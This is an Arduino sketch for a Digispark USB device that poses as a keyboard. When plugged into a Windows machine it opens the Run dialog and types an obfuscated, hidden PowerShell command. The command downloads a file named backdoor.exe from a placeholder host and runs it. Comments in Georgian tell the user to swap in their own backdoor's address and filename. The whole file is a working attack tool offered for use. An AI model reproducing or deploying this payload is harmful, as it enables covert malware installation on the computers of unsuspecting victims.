#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://example.com/backdoor.exe\\\",\\\"$env:UserProfile\\desktop\\backdoor.exe\\\");in'v'oke-item $env:UserProfile\\desktop\\backdoor.exe"));
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
// [Line 11]  - https://example.com/backdoor.exe -ს მაგივრად ჩაწერეთ თქვენი ბექდორის მისამართი,
// [Line 11]  - backdoor.exe -ს მაგივრად გაწერეთ თქვენი ბექდორის filename
